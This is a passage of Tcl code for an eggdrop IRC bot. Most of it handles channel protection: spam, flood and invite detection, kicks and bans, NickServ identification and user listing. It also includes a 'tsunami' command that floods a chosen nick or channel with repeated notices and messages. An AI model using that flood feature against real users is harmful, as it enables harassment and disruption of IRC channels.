         if {[isop $botnick $person] && ![matchattr $nick m]} {
            if {[isutimer "IN PROGRESS"]} { return 0 }
            utimer 20 [list putlog "IN PROGRESS"]
            putserv "KICK $channel $nick :1cHaNNeL 4FLoOd1 PRoTecTIoN4..!"
            return 0
         }
      }
   }
   if {[matchattr $person n] && ![matchattr $nick Z]} {
      if {[isop $botnick $channel]} {
         putserv "KICK $channel $nick :1ADmIN 4FLoOd1 PRoTecTIoN4..!"
      }
      if {[istimer "IN PROGRESS"]} { return 0 }
      timer 2 [list putlog "IN PROGRESS"]
      putserv "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
      puthelp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
      puthelp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
      puthelp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
      return 0
   }
   if {![matchattr $nick Z]} {
      return 0
   }
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: tsunami <nick/#> <msg>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[string tolower $person] == [string tolower $ps]} { return 0 }
   if {[string index $person 0] == "#"} {
      if {![validchan $person]} {
         pub_randnick $nick $uhost $hand $channel ""
         set cmd_chn $person
         set cmd_msg $rest
         set cmd_by $nick
         set cmd_case "1"
         channel add $person
         catch { channel set $person +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
         return 0
      }
   }
   catch { clearqueue all }
   pub_randnick $nick $uhost $hand $channel ""
   if {[string index $person 0] == "#"} { setignore "*!*@*" "*" 120 }
   if {$quick == "1"} {
      putquick "PRIVMSG $person :$rest,"
      putquick "NOTICE $person :$rest,"
   }
   putserv "NOTICE $person :$rest,"
   puthelp "NOTICE $person :$rest,"
   puthelp "NOTICE $person :$rest,"
   puthelp "NOTICE $person :$rest,"
   puthelp "NOTICE $person :$rest,"
   puthelp "NOTICE $person :$rest,"
   utimer 10 { 
      puthelp "AWAY" 
   }
   utimer 120 goback
   return 0
}
bind time -  "*2 * * * *" auto_ident
proc auto_ident {min h d m y} {
   timer 5 ident_it

}
set words { 
"\002*SCaNNiNg*\002"
"\002*TuiNk.TuiNk*\002"
"\002*ZzZT ZzzT*\002"
"SCaNNiNg Lam3R..."
"SCaNNiNg iNViTeR..."
"Search... Search..."
"\002*BzT BzT*\002"
"*nyams*"
"lol"
"!seen *guest* :P"
"!play, !next, !stop :D"
"brb"
"back!"
"cuek!"
"heh"
"on!"
"off!"
"here!"
"!auth"
"!login"
":P"
":D"
"hmm..."
"what?"
"ge to loch!"
"1+1=?"
"Pengeeeeeeeeeen....."
"GeraH"
"ScaNNiNg"
"NgeKek"
"LaG"
"Slaps Oreo With SemPak"
"GiLa"
"GalaU"
"*"
"...."
"��"
"Laper.."
"NganTuk Iz"
"Hmm *Kok sepi Sih..?"
"sets mode +m"
"Nyimak aja"
"is now known as X"
"is now known as BoT"
}
bind time - "45 * * * *" wordstime
bind time - "50 1 * * *" wordstime
proc wordstime {n h handle ch te} {
   global words 
   foreach x [channels] {
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      if {[string match "*+action*" [channel info $x]]} {
         if {[getuser $cflag XTRA "ACTION"] == ""} {
            putserv "PRIVMSG $x :\001ACTION [lindex $words [rand [llength $words]]]\001"
         } { 
            putserv "PRIVMSG $x :\001ACTION [getuser $cflag XTRA "ACTION"]\001"
         }
      }
   }
}
proc ident_it {} {
   global nick altnick botnick nickpass altpass ex_flood invme pingchan own chk_reg
   global kickme deopme cmd_chn cmd_msg ps twice_msg keep-nick version notc lastkey
   global flooddeop floodnick floodkick server-online is_m op_it jpfchn jpfmsg jpfidx
   putlog "!Log! AuTO ReSETING & IDeNTIFY"
   catch { channel remove $jpfchn }
   catch { unset jpfchn }
   catch { unset jpfmsg }
   catch { unset jpfidx }
   catch {unset op_it}
   catch {unset is_m}
   catch {unset chk_reg}
   catch {unset flooddeop}
   catch {unset floodnick}
   catch {unset floodkick}
   catch {unset lastkey}
   catch {unset ex_flood}
   catch {unset invme}
   catch {unset pingchan}
   catch {unset twice_msg}
   catch {unset kickme}
   set deopme ""
   set cmd_chn ""
   set cmd_msg ""
   if {${server-online} == 0} { return 0 }
   if {![string match "ERR??????????" $botnick] && ![string match "ERR??????" $botnick]} {
      if {$botnick != $nick && $botnick != $altnick && ![istimer "goback"] && ![isutimer "goback"]} { goback }
   } {
      goback
   }
   if {$botnick == $nick && $nickpass != ""} {
      putserv "NickServ identify $nickpass"
   }
   if {$botnick != $nick && $nickpass != ""} {
      putserv "NickServ identify $nick $nickpass"
   }
   if {$ps != $own} {
      set own $ps
   }
   if {![isutimer "del_nobase"] && ![istimer "del_nobase"]} { utimer 2 del_nobase }
}

proc remain {} {
   global botnick uptime timezone notc notd vern longer awaybanner awban
   set totalyear [expr [unixtime] - $uptime]
   if {$totalyear >= 31536000} {
      set yearsfull [expr $totalyear/31536000]
      set years [expr int($yearsfull)]
      set yearssub [expr 31536000*$years]
      set totalday [expr $totalyear - $yearssub]
   }
   if {$totalyear < 31536000} {
      set totalday $totalyear
      set years 0
   }
   if {$totalday >= 86400} {
      set daysfull [expr $totalday/86400]
      set days [expr int($daysfull)]
      set dayssub [expr 86400*$days]
      set totalhour [expr $totalday - $dayssub]
   }
   if {$totalday < 86400} {
      set totalhour $totalday
      set days 0
   }
   if {$totalhour >= 3600} {
      set hoursfull [expr $totalhour/3600]
      set hours [expr int($hoursfull)]
      set hourssub [expr 3600*$hours]
      set totalmin [expr $totalhour - $hourssub]
   }
   if {$totalhour < 3600} {
      set totalmin $totalhour
      set hours 0
   }
   if {$totalmin >= 60} {
      set minsfull [expr $totalmin/60]
      set mins [expr int($minsfull)]
   }
   if {$totalmin < 60} {
      set mins 0
   }
   if {$years < 1} {set yearstext ""} elseif {$years == 1} {set yearstext "$years year, "} {set yearstext "$years years, "}
   if {$days < 1} {set daystext ""} elseif {$days == 1} {set daystext "$days day, "} {set daystext "$days days, "}
   if {$hours < 1} {set hourstext ""} elseif {$hours == 1} {set hourstext "$hours HoUR, "} {set hourstext "$hours HoURS, "}
   if {$mins < 1} {set minstext ""} elseif {$mins == 1} {set minstext "$mins MiNuTE"} {set minstext "$mins MiNuTES"}
   if {[string length $mins] == 1} {set mins "0${mins}"}
   if {[string length $hours] == 1} {set hours "0${hours}"}
   set output "${yearstext}${daystext}${hours}:${mins}"
   set output [string trimright $output ", "]
   if {[getuser "config" XTRA "TeGaL"]!=""} {
      set awban $awaybanner
   } {
      set awban [lgrnd]
   }
   if {[getuser "config" XTRA "AWAY"]!=""} {
      set longer "$awban $vern )"
   } {
      set longer "$awban $vern "
   }
}
proc msg_userlist {nick hand uhost rest} {
   global notc 
   pub_userlist $nick $uhost $hand "" $rest
}
proc pub_userlist {nick uhost hand chan rest} {
   global ps notc 
   set akicklist " 4KIcKLIsT"
   foreach y [getuser "AKICK" HOSTS] {
      append akicklist " $y "
   }
   set users "UsERLIsT:"
   foreach x [userlist] {
      if {($x != "config") && ($x != "AKICK") && ($x != $ps) && ![matchattr $x A]} {
         if {[matchattr $x O]} { 
            append users " 4$x "
         } else { append users " $x " }
         set flag [chattr $x]
         append users "($flag)"
      }
   }
   append users " \[$akicklist\]"
   if {[getuser "config" XTRA "IPG"] != ""} {
      append users " IpguaRd [getuser "config" XTRA "IPG"]"
   }
   if {[string length $users] > 300} {
      set half [expr [string length $users]/3]
      set half [expr int($half)]
      set ntc "[string range $users 0 $half].."
      puthelp "NOTICE $nick :$ntc"
      set ntc "..[string range $users [expr $half + 1] [expr $half + $half]].."
      puthelp "NOTICE $nick :$ntc"
      set ntc "..[string range $users [expr $half + 1 + $half] end]"
      puthelp "NOTICE $nick :$ntc"
   } elseif {[string length $users] > 200} {
      set half [expr [string length $users]/2]
      set half [expr int($half)]
      set ntc "[string range $users 0 $half].."
      puthelp "NOTICE $nick :$ntc"
      set ntc "..[string range $users [expr $half + 1] end]"
      puthelp "NOTICE $nick :$ntc"
   } else {
      puthelp "NOTICE $nick :$users"
   }
   return 0
}
proc pub_ver {nick uhost hand chan rest} {
   global vern
   puthelp "PRIVMSG $chan :$vern LaST UpDaTE On $update"
   return 0
}
proc pub_logo {nick uhost hand chan rest} {
   global banner
   if {[info exists banner]} {
      puthelp "PRIVMSG $chan :$banner"
   } {
      puthelp "PRIVMSG $chan :[lgrnd]"
   }
   return 0
}
proc pub_logoaway {nick uhost hand chan rest} {
   global awaybanner
   if {[info exists awaybanner]} {
      puthelp "PRIVMSG $chan :$awaybanner"
   } {
      puthelp "PRIVMSG $chan :[lgrnd]"
   }
   return 0
}
proc pub_ping {nick uhost hand chan rest} {
   puthelp "PRIVMSG $chan :$nick, �13PonK�"
   return 0
}
proc pub_nobot {nick uhost hand chan rest} {
   global botnick
   if {![isop $botnick $chan]} { return 0 }
   if {[isutimer "pub_nobot"]} { return 0 }
   if {[rand 2] <= 1} {
      puthelp "PRIVMSG $chan :\001USERINFO\001"
   } {
      puthelp "PRIVMSG $chan :\001CLIENTINFO\001"
   }
   return 0
}
bind ctcr - USERINFO ui_reply
bind ctcr - CLIENTINFO ui_reply
proc ui_reply {nick uhost hand dest key arg} {
   global botnick bannick notc ismaskhost
   if {![string match "*eggdrop*" $arg]} { return 0 }
   if {$nick == $botnick || [matchattr $nick f]} { return 0 }
   foreach x [channels] {
      if {[onchan $nick $x] && [isop $botnick $x] && ![isop $nick $x]} {
         if {[info exists ismaskhost]} {
            set bannick($nick) [maskhost "*!*[string range $uhost [string first "@" $uhost] end]"]
         } {
            set bannick($nick) "*!*[string range $uhost [string first "@" $uhost] end]"
         }
         putserv "KICK $x $nick :4[string toupper $x]1 FoRBIDDeN FoR 4EggY1 DuE tO LamE AnTIcIPaTEd [banmsg]"
         return 0
      }
   }
}

proc pub_reset {nick uhost hand chan rest} {
   global notc
   putserv "NOTICE $nick :!ReSeT!"
   ident_it
}
proc pub_pong {nick uhost hand chan rest} {
   global pingchan
   putserv "NOTICE $nick :\001PING [unixtime]\001"
   set pingchan($nick) $chan
   return 0
}
proc pub_auth {nick uhost hand chan rest} {
   global botnick notc
   set cmd [string tolower [lindex $rest 0]]
   set ch [passwdok $nick ""]
   if {$ch == 1} {
      puthelp "NOTICE $nick :No password set. Usage: pass <password>" 
      return 0
   }
   if {[matchattr $nick Q]} { 
      puthelp "PRIVMSG $chan :${nick}, Oi..Oi...Boss...!!!"
   }
   if {![matchattr $nick Q]} { 
      puthelp "NOTICE $nick :${nick}, 4NO!"
   }
}
proc notc_prot {nick uhost hand text {dest ""}} {
   global notc botnick notc_chn bannick notm quick ismaskhost is_m
   if {$dest != "" && $dest != $botnick} {
      if {[string index $dest 0] == "+" || [string index $dest 0] == "@"} {
         foreach x [channels] {
            set x [string tolower $x]
            if {[string match "*$x*" [string tolower $dest]]} {
               set dest $x
               break
            }
         }
      } 
      if {[isop $botnick $dest]} {
         if {[string match "*-greet*" [channel info $dest]]} { return 0 }
         if {$nick == "ChanServ"} { return 0 }
         if {$nick == $botnick} { return 0 }
         if {[matchattr $nick f]} { return 0 }
         if {[isop $nick $dest]} { return 0 }
         if {[isutimer "set_-m $dest"]} { return 0 }
         set banmask "$nick!*@*"
         if {[info exists notc_chn($dest)]} {
            incr notc_chn($dest)
         } {
            set notc_chn($dest) 1
         }
         if {$notc_chn($dest) == 1} {
            putserv "KICK $dest $nick :1ABusINg 4NoTIcE1 @ps OnLY"
         } elseif {$notc_chn($dest) == 2} {
            if {$quick == "1" && ![info exists is_m($dest)]} {
               putquick "KICK $dest $nick :1TwIcE 4NoTIcE1 ABusEd"
            } {
               putserv "KICK $dest $nick :1TwIcE 4NoTIcE1 ABusEd"
            }
         } elseif {$notc_chn($dest) >= 3} {
            if {[info exists ismaskhost]} {
               set bannick($nick) [maskhost $banmask]
            }
            if {$quick == "1" && ![info exists is_m($dest)]} {
               putquick "KICK $dest $nick :1tO mUcH 4vIoLencE1 FRoM THIS I.S.P 4@uT.1 !!"
            } {
               putserv "KICK $dest $nick :1tO mUcH 4vIoLencE1 FRoM THIS I.S.P 4@uT.1 !!"
            }
         }
         return 0
      }
      repeat_pubm $nick $uhost $hand $dest $text
   } {
      msg_prot $nick $uhost $hand $text
   }
}
bind nick - * ps:check
proc setignore {mask reason time} {
   global quick
   foreach x [ignorelist] {
      if {[lindex $x 0] == $mask} { return 0 }
   }
   newignore $mask "IgN" $reason 15
   if {$quick == "1"} {
      putquick "silence +$mask"
   } {
      putserv "silence +$mask"
   }
   utimer $time [list unsetignore $mask]
}
proc unsetignore {mask} {
   if {![isignore $mask]} { return 0 }
   putserv "silence -$mask"
   killignore $mask
}
set massmsg 0
proc msg_prot {unick uhost hand text} {
   global nick botnick invme own nickpass altpass notc notb notd virus_nick ex_flood vern 
   global altnick twice_msg version bannick massmsg keep-nick badwords advwords quick is_m ismaskhost
   regsub -all -- \" $text "" text
   msg_Z $unick $uhost $hand $text
   set real $text
   set text [uncolor $text]
   if {$unick == $botnick} { return 0 }
   if {[string match "*dcc send*" [string tolower $text]] && ![string match "*Serv*" $unick] && ![matchattr $unick f]} {
      set virus_nick $unick
      foreach x [channels] {
         if {[onchan $virus_nick $x] && ![matchattr $virus_nick f] && ![isop $virus_nick $x]} {
            if {[isop $botnick $x]} {
               set host [getchanhost $virus_nick $x]
               set host "$nick!*@*"
               set bannick($virus_nick) $host
               putserv "KICK $x $virus_nick :4!SpaM!1 I HaTE 4VIRuZ [banms]"
               set virus_nick ""
            } else {
               set members [chanlist $x f]
               foreach c $members {
                  if {[isop $c $x]} {
                     set sendspam "!kick $x $unick 4!SpaM!1 FRoM 4@[lindex [split [getchanhost $virus_nick $x] @] 1]1 ViRuZ [banmsg]"
                     putserv "PRIVMSG $c :$sendspam"
                     return 0
                  }
               }
            }
         }
      }
      return 0
   }
   if {$unick == "ChanServ"} {
      if {[string match "*You do not have access to op people on*" $text] && [getuser "config" XTRA "MUSTOP"] != "" && $botnick == $nick} {
         set partchn [lindex $text 9]
         set partchn [string range $partchn 0 [expr [string length $partchn]-2]]
         if {[string match "*-secret*" [channel info $partchn]]} {
            putserv "PART $partchn :((((@pGuaRd))))"
            channel remove $partchn
            savechan
         }
      }
      if {[string match "*is not on*" $text]} { 
         set text [string tolower $text]
         foreach x [channels] {
            set x [string tolower $x]
            set cflag "c$x"
            set cflag [string range $cflag 0 8]
            if {[string match "*$x*" $text]} {
               if {![string match "*c*" [getchanmode $x]]} {
                  putserv "PART $x :1regained (4@1)ps status"
               } {
                  putserv "PART $x :1regained (@)ps status"
               }
               if {[matchattr $cflag K]} {
                  puthelp "JOIN $x :[dezip [getuser $cflag XTRA "CI"]]"
               } {
                  puthelp "JOIN $x"
               }
            }
         }
         return 0
      }
      if {[string match "*AOP:*SOP:*AKICK*" $text]} {
         foreach errchan [channels] {
            set cflag "c$errchan"
            set cflag [string range $cflag 0 8]
            if {[string match "*[string tolower $errchan] *" [string tolower $text]]} {
               if {![isop $botnick $errchan]} {
                  timer 1 { putlog "resync" }
                  if {![string match "*c*" [getchanmode $errchan]]} {
                     putserv "PART $errchan :1regained (4@1)ps status"
                  } {
                     putserv "PART $errchan :regained (@)ps status"
                  }
                  if {[matchattr $cflag K]} {
                     puthelp "JOIN $errchan :[dezip [getuser $cflag XTRA "CI"]]"
                  } {
                     puthelp "JOIN $errchan"
                  }
               }
               return 0
            }
         }
      }
      return 0 
   }
   if {$unick == "NickServ"} {
      if {[string match "*This nickname is already registered*" [string tolower $text]]} { 
         putlog "!Log! IDeNTIFY"
         catch { clearqueue all }
         if {$botnick == $nick && $nickpass != ""} { 
            putserv "NickServ identify $nickpass"
         }
         if {$botnick == $altnick && $altpass != ""} { 
            putserv "NickServ identify $altpass"
         }
      }
      if {[string match "*You are now identified*" $text]} { auto_reop }
      if {[string match "*is not a registered nickname*" $text] && $nickpass != ""} {
         if {[getuser "config" XTRA "EMAIL"] != ""} {
            putserv "NickServ register $nickpass [getuser "config" XTRA "EMAIL"]"
         }
      }
      if {[string match "*is now registered to*" $text]} {
         putserv "NickServ identify $nickpass"
      }
      return 0
   }
   if {$unick == "MemoServ"} {
      if {[string match "*New allnetwork news is available*" $text]} {
         putserv "PRIVMSG MemoServ :READ"
      }
      return 0
   }
   if {[string match "!kick*" [string tolower $text]]} {
      set salls [dezip [lrange $text 1 end]]
      set schan [lindex $salls 0]
      set snick [lindex $salls 1]
      set sreas [lrange $salls 2 end]
      if {![isop $botnick $schan] || [matchattr $snick f] || ![onchan $snick $schan]} { return 0 }
      set banhost [getchanhost $snick $schan]
      set banhost "$nick!*@*"
      set bannick($snick) $banhost
      regsub -all -- \{ $sreas "" sreas
      regsub -all -- \} $sreas "" sreas
      putserv "KICK $schan $snick :$sreas"
      return 0
   }
   if {[string match "*auth*" $text] || [string match "*[string tolower $notb]*" [string tolower $text]]} { return 0 }
   if {[matchattr $hand f]} { return 0 }
   set mhost [string range $uhost [string first "@" $uhost] end]
   if {![isutimer "MSGCOUNTER"]} {
      utimer 20 { putlog "MSGCOUNTER" }
      set massmsg 1
   } {
      set massmsg [incr massmsg]
      if {[string length $text] > 100} {
         set massmsg [incr massmsg]
      }
      if {$massmsg >= 5} {
         set massmsg 0
         set mhost [string range $uhost [string first "@" $uhost] end]
         setignore "*!*@*" "*" 120
         if {[info exists ismaskhost]} {
            setignore [maskhost "*!*$mhost"] "MaZz MSg" 300
         } {
            setignore "*!*$mhost" "MaZz MSg" 300
         }
         foreach iamop [channels] {
            if {[isop $botnick $iamop]} {
               if {[string match "*c*" [getchanmode $iamop]]} {
                  puthelp "PRIVMSG $iamop :\001ACTION IncOmINg MaZz MSg..! LasT FRoM [unsix "$unick!$uhost"]\001"
               } {
                  puthelp "PRIVMSG $iamop :\001ACTION IncOmINg MaZz MSg..! LasT FRoM 1[unsix "$unick!$uhost"]\001"
               }
               foreach c [chanlist $iamop] {
                  set nickhost [string range [getchanhost $c $iamop] [string first "@" [getchanhost $c $iamop]] end]
                  if {$nickhost == $mhost && ![matchattr $c f]} {
                     if {$c == $botnick} { return 0 }
                     set bannick($c) "$nick!*@*"
                     putserv "KICK $iamop $c :1Heavy 4FLoOd1 MSg FRoM 4$mhost [banms]"
                     break
                  }
               }
            }
         }
         return 0
      }
   }
   if {[string match "*decode*" [string tolower $text]]} {
      foreach x [channels] {
         if {[onchan $unick $x]} {
            if {[isop $botnick $x]} {
               set bannick($unick) "$nick!*@*"
               putserv "KICK $x $unick :4!SpaM!1 I HaTE 4dEcOdE [banms]"
               return 0
            } {
               set members [chanlist $x f]
               foreach c $members {
                  if {[isop $c $x]} {
                     set sendspam "!kick $x $unick 4!SpaM!1 FRoM 4[string range $uhost [string first "@" $uhost] end]1 dEcOdE [banmsg]"
                     putserv "PRIVMSG $c :$sendspam"
                     return 0
                  }
               }
            }
         }
      }
      set invme($mhost) "dEcOdE"
   }
   if {[string match "*#*" $text] || [string match "*/j*" $text]} {
      foreach x [channels] {
         set chksiton [string tolower $x]
         if {[string match "*$chksiton*" [string tolower $text]]} { return 0 }
      }
      foreach x [channels] {
         if {[onchan $unick $x]} {
            if {[isop $botnick $x]} {
               set banmask "$nick!*@*"
               set bannick($unick) $banmask
               putserv "KICK $x $unick :4!SpaM!1 I HaTE 4InvITeR [banms]"
               return 0
            } {
               set members [chanlist $x]
               foreach c $members {
                  if {[isop $c $x]} {
                     set sendspam "!kick $x $unick 4!SpaM!1 FRoM 4[string range $uhost [string first "@" $uhost] end]1 InvITE [banmsg]"
                     putserv "PRIVMSG $c :$sendspam"
                     return 0
                  }
               }
            }
         } {
            set banmask "[string range $uhost [string first "@" $uhost] end]"
            if {$banmask != "*!*@*" && $banmask != "*"} {
               foreach c [chanlist $x] {
                  set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
                  if {$banmask == $nickhost} {
                     if {[matchattr $c f]} {
                        putlog "!Log! InVITE (f) $c PaSS!!"
                        return 0
                     }
                     if {$c != $botnick} {
                        if {[isop $botnick $x]} {
                           set bannick($c) $banmask
                           set mhost [string range $uhost [string first "@" $uhost] end]
                           putserv "KICK $x $c :4!SpaM!1 InvITeR 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"
                        } {
                           set members [chanlist $x f]
                           foreach s $members {
                              if {[isop $s $x]} {
                                 set mhost [string range $uhost [string first "@" $uhost] end]
                                 set sendspam "!kick $x $c 4!SpaM!1 InvITeR 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"
                                 putserv "PRIVMSG $s :$sendspam"
                                 break
                              }
                           }
                        }
                        return 0
                     }
                  }
               }
            }
         }
      }
      set invme($mhost) "InvITE"
      return 0
   }
   if {[string match "*http:/*" [string tolower $text]] || [string match "*www.*" [string tolower $text]]} {
      if {[string match "*allnetwork.org" [string tolower $text]]} { return 0 }
      foreach x [channels] {
         if {[onchan $unick $x]} {
            if {[isop $botnick $x]} {
               set banmask "$nick!*@*"
               set bannick($unick) $banmask
               putserv "KICK $x $unick :4!SpaM!1 I HaTE 4AdvERTIsE [banms]"
               return 0
            } else {
               set members [chanlist $x f]
               foreach c $members {
                  if {[isop $c $x]} {
                     set sendspam "!kick $x $unick 4!SpaM!1 FRoM 4[string range $uhost [string first "@" $uhost] end]1 AdvERTIsE [banmsg]"
                     putserv "PRIVMSG $c :$sendspam"
                     return 0
                  }
               }
            }
         } {
            set banmask "[string range $uhost [string first "@" $uhost] end]"
            if {$banmask != "*!*@*" && $banmask != "*"} {
               foreach c [chanlist $x] {
                  set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
                  if {$banmask == $nickhost} {
                     if {[matchattr $c f]} {
                        putlog "!Log! InVITE (f) $c PaSS!!"
                        return 0
                     }
                     if {$c != $botnick} {
                        if {[isop $botnick $x]} {
                           set bannick($c) $banmask
                           set mhost [string range $uhost [string first "@" $uhost] end]
                           putserv "KICK $x $c :4!SpaM!1 AdvERTIsE 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"
                        } {
                           set members [chanlist $x f]
                           foreach s $members {
                              if {[isop $s $x]} {
                                 set mhost [string range $uhost [string first "@" $uhost] end]
                                 set sendspam "!kick $x $c 4!SpaM!1 AdvERTIsE 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"
                                 putserv "PRIVMSG $s :$sendspam"
                                 return 0
                              }
                           }
                        }
                        return 0
                     }
                  }
               }
            }
         }
      }
      set invme($mhost) "AdvERTIsE"
      return 0
   }
   set mhost [string range $uhost [string first "@" $uhost] end]
   if {[string length $text] > 100} {
      set chr 0
      set cnt 0
      while {$cnt < [string length $real]} {
         if [isflood [string index $real $cnt]] {
            incr chr
         }
         incr cnt
      }
      if {$chr > 30} {
         setignore "*!*@*" "*" 120
         if {[info exists ismaskhost]} {
            setignore [maskhost "*!*$mhost"] "TsunamI MSg" 300
         } {
            setignore "*!*$mhost" "TsunamI MSg" 300
         }
         foreach x [channels] {
            if {[isop $botnick $x]} {
               if {[string match "*c*" [getchanmode $x]]} {
                  puthelp "PRIVMSG $x :\001ACTION IncOmINg TsunamI MSg..! FRoM [unsix "$unick!$uhost"]\001"
               } {
                  puthelp "PRIVMSG $x :\001ACTION IncOmINg TsunamI MSg..! FRoM 1[unsix "$unick!$uhost"]\001"
               }
               foreach c [chanlist $x] {
                  set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
                  if {$nickhost == $mhost} {
                     if {[matchattr $c f] || $c == $botnick} {
                        return 0
                     }
                     set bannick($c) "$nick!*@*"
                     putserv "KICK $x $c :4TsunamI1 MSg FRoM 4$mhost [banms]"
                     break
                  }
               }
            }
         }
         return 0
      }
   }
   foreach badword [string tolower $badwords] {
      if {[string match *$badword* [string tolower $text]]} {
         foreach x [channels] {
            if {[onchan $unick $x]} {
               if {[isop $unick $x] || [isvoice $unick $x]} { return 0 }
               if {[isop $botnick $x]} {
                  set bannick($unick) "$nick!*@*"
                  putserv "KICK $x $unick :4BaDWoRD1 MSg FRoM 4$mhost1 MaTcH FRoM 4[string toupper $badword] [banms]"
                  return 0
               } {
                  foreach s [chanlist $x f] {
                     if {[isop $s $x]} {
                        set sendspam "!kick $x $unick 4BaDWoRD1 MSg FRoM 4$mhost1 MaTcH FRoM 4[string toupper $badword] [banms]"
                        putserv "PRIVMSG $s :$sendspam"
                     }
                  }
               }
            }
         }
      }
   }
   foreach advword [string tolower $advwords] {
      if {[string match *$advword* [string tolower $text]]} {
         foreach x [channels] {
            if {[onchan $unick $x]} {
               if {[isop $unick $x] || [isvoice $unick $x]} { return 0 }
               if {[botisop $x]} {
                  set bannick($unick) "$nick!*@*"
                  putserv "KICK $x $unick :4!SpaM!1 I HaTE 4U 1MaTch FRoM $advword [banmsg]"
                  return 0
               } {
                  foreach s [chanlist $x f] {
                     if {[isop $s $x]} {
                        set sendspam "!kick $x $unick 4SpaM1 MSg FRoM 4$mhost1 MaTcH FRoM 4[string toupper $advword] [banms]"
                        putserv "PRIVMSG $s :$sendspam"
                     }
                  }
               }
            }
         }
      }
   }
   if {[string length $text] > 200} {
      if {![isutimer "LONGTEXT"]} {
         utimer 30 { putlog "LONGTEXT" }
         setignore "*!*@*" "*" 120
         if {[info exists ismaskhost]} {
            setignore [maskhost "*!*$mhost"] "LoNg TexT MSg" 300
         } {
            setignore "*!*$mhost" "LoNg TexT MSg" 300
         }
      }
      foreach x [channels] {
         if {[isop $botnick $x]} {
            if {[string match "*c*" [getchanmode $x]]} {
               puthelp "PRIVMSG $x :\001ACTION IncOmINg LoNg TexT MSg..! FRoM [unsix "$unick!$uhost"]\001"
            } {
               puthelp "PRIVMSG $x :\001ACTION IncOmINg LoNg TexT MSg..! FRoM 1[unsix "$unick!$uhost"]\001"
            }
            foreach c [chanlist $x] {
               set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
               if {$nickhost == $mhost} {
                  if {[matchattr $c f] || $c == $botnick} { return 0 }
                  set bannick($c) "$nick!*@*"
                  putserv "KICK $x $c :1LoNg TexT MSg FRoM 4$mhost [banms]"
                  break
               }
            }
         } {
            foreach c [chanlist $x] {
               set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
               if {$nickhost == $mhost} {
                  if {[matchattr $c f] || $c == $botnick} {
                     return 0
                  }
                  foreach s [chanlist $x f] {
                     if {[isop $s $x]} {
                        set sendspam "!kick $x $c 1LoNg TexT MSg FRoM 4$mhost [banms]"
                        putserv "PRIVMSG $s :$sendspam"
                        break
                     }
                  }
               }
            }
         }
      }
      return 1
   }
   if {$unick != $own} {
      if {[info exists twice_msg($unick)]} {
         set hostmask "${unick}!*@*"
         puthelp "PRIVMSG $unick :SoRRY YoU HaVE BEEN IgNORED..!"
         putlog "!Log! IgNORE <<$hostmask>> PV-msg"
         unset twice_msg($unick)
         newignore $hostmask $unick "*" 2
      } {
         if {[istimer "chkautomsg"]} {
            set invme($mhost) "AuToJoIN MSg"
            return 0
         }
         if {[isutimer "NO REPLY"]} { 
            foreach x [utimers] {
               if {[string match "*NO REPLY*" $x]} { 
                  killutimer [lindex $x 2] 
               }
            }
            utimer 10 { putlog "NO REPLY" }
            return 0
         }
         utimer 10 { putlog "NO REPLY" }
         if {[string match "*allnetwork*rg*" $uhost]} {
            puthelp "PRIVMSG $unick :I am Away. Reason: Swiming to other world \[$vern TcL\]"
         } {
            if {[getuser "config" XTRA "AWAY"]!=""} { 
               puthelp "PRIVMSG $unick :I am Away. Reason: Swiming to other world \[$vern TcL\]"
            } {
               puthelp "PRIVMSG $unick :I am Away. Reason: Swiming to other world \[$vern TcL\]"
            }
            set twice_msg($unick) 1
         }
      }
   }
}
proc auto_reop {} {
   global notc botnick
   foreach x [channels] {
      if {[onchan $botnick $x]} { 
         if {![isop $botnick $x] && [string tolower $x] != "#TeGaL"} {
            if {![string match "*+protectfriends*" [channel info $x]]} {
               set cret 30
               foreach ct [utimers] {
                  if {[string match "*chancnt*" $ct]} {
                     if {[expr [lindex $ct 0] + 30] > $cret} {
                        set cret [expr [lindex $ct 0] + 30]
                     }
                  }
               }
               utimer $cret [list chancnt $x]
            }
         }
      }
   }
   return 0
}
proc chancnt {chan} {
   if {[isutimer "chancnt $chan"]} { return 0 }
   putserv "ChanServ count $chan"
}

proc msg_kick {nick uhost hand rest} {
   global notc botnick own
   set chantarget [lindex $rest 0]
   set nicktarget [lindex $rest 1]
   set reason [lrange $rest 2 end]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {($chantarget == "") || ($nicktarget == "")} {
      puthelp "NOTICE $nick :Usage: kick <#chan> <Nick> <Reason>"
      return 0
   }
   if {[isop $botnick $chantarget]!=1} {
      puthelp "NOTICE $nick :NoT OP CHaNNEL $chantarget"
      return 0
   }
   if {![onchan $nicktarget $chantarget]} {
      puthelp "NOTICE $nick :$nicktarget is not on the channel."
      return 0
   }
   if {$nicktarget == $botnick} {
      puthelp "NOTICE $nick :I cant self kick."
      return 0
   }
   if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
      puthelp "NOTICE $nick :I CaNT KIcK MY ADmIN."
      return 0
   }
   if {$reason == ""} {
      set reason "1ReQuesT..!"
      if {[matchattr $nick n]} { 
         set reason "1ADmIN 4KIcK1 ReQuesT4..!" 
      }
      if {[matchattr $nick m] && ![matchattr $nick n]} { 
         set reason "1MasTeR 4KIcK1 ReQuesT4..!" 
      }
   }
   foreach x [channels] {
      if {[string tolower $x]==[string tolower $chantarget]} {
         putserv "KICK $x $nicktarget :$reason"
         return 0
      }
   }
